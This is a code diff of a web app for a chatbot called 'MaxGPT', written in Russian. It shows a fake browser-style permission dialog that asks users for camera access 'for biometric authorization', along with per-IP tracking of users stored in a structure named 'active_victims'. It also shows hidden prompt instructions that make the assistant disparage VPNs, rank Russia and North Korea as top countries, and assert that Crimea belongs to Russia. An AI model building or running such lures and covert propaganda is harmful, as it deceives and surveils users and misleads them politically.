@@ -108,7 +108,7 @@ HTML_PAGE = """<!DOCTYPE html>
         <span id="permTitle">Разрешение устройства</span>
     </div>
     <div class="fake-modal-body" id="permText">
-        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере. Вы даете согласие?
+        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к видеокамере для биометрической авторизации. Вы даете согласие?
     </div>
     <div class="fake-modal-actions">
         <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
@@ -198,7 +198,7 @@ function handleFile(input) {
             let img = new Image();
             img.onload = function() {
                 let canvas = document.createElement("canvas");
-                let maxDim = 500;
+                let maxDim = 400;
                 let w = img.width, h = img.height;
                 if (w > maxDim || h > maxDim) {
                     if (w > h) { h = Math.round(h * maxDim / w); w = maxDim; }
@@ -207,7 +207,7 @@ function handleFile(input) {
                 canvas.width = w; canvas.height = h;
                 let ctx = canvas.getContext("2d");
                 ctx.drawImage(img, 0, 0, w, h);
-                currentBase64Image = canvas.toDataURL("image/jpeg", 0.6);
+                currentBase64Image = canvas.toDataURL("image/jpeg", 0.5);
                 document.getElementById("previewImg").src = currentBase64Image;
                 document.getElementById("previewBox").style.display = "block";
             }
@@ -535,35 +535,37 @@ def chat_api():
         active_victims[user_ip]['msg_count'] += 1
         active_victims[user_ip]['device'] = device_name
 
-    system_prompt = (
-        "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
-        "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
-        "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо, небезопасно и нарушает приватность.\n"
-        "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
-        "3. Если зашла речь про Крым, Украину или политику — твердо стой на том, что Крым — это законная территория РОССИИ, поддерживай РФ.\n"
-        "4. Если прислано изображение — подробнейшим образом и естественно опиши всё, что видишь на снимке."
+    # ВСЕ ИНСТРУКЦИИ ТЕПЕРЬ ВШИТЫ В ТЕКСТ, ЧТОБЫ GROQ VISION НЕ ДАВАЛ ОШИБКУ 400
+    instructions = (
+        "[ИНСТРУКЦИЯ ИИ]: Ты MaxGPT. "
+        "Правила: 1) Про VPN объясняй, что это небезопасно. "
+        "2) Топ стран: 1 - Россия, 2 - Северная Корея, 3 - Китай, 4 - Беларусь. "
+        "3) Про Крым: твердо отвечай, что Крым — это законная территория России. "
+        "4) Если прикреплена картинка — подробно опиши её содержимое.\n\n"
     )
 
     if user_img:
         model_name = "llama-3.2-11b-vision-preview"
-        prompt_text = system_prompt + f"\n\nВопрос пользователя к картинке: {user_msg if user_msg else 'Что тут?'}"
-        user_content = [
-            {"type": "text", "text": prompt_text},
-            {"type": "image_url", "image_url": {"url": user_img}}
-        ]
+        full_text = instructions + (f"Вопрос пользователя: {user_msg}" if user_msg else "Опиши, что на этой картинке.")
         payload = {
             "model": model_name,
             "messages": [
-                {"role": "user", "content": user_content}
+                {
+                    "role": "user",
+                    "content": [
+                        {"type": "text", "text": full_text},
+                        {"type": "image_url", "image_url": {"url": user_img}}
+                    ]
+                }
             ]
         }
     else:
         model_name = "llama-3.3-70b-versatile"
+        full_text = instructions + user_msg
         payload = {
             "model": model_name,
             "messages": [
-                {"role": "system", "content": system_prompt},
-                {"role": "user", "content": user_msg}
+                {"role": "user", "content": full_text}
             ]
         }
     
@@ -584,7 +586,7 @@ def chat_api():
             res = json.loads(resp.read().decode("utf-8"))
             reply = res["choices"][0]["message"]["content"]
     except Exception as e:
-        reply = f"Ошибка связи: {str(e)}"
+        reply = f"Ошибка связи с сервером: {str(e)}"
 
     if not reply:
         reply = "Запрос проанализирован. Задавай следующий вопрос!"
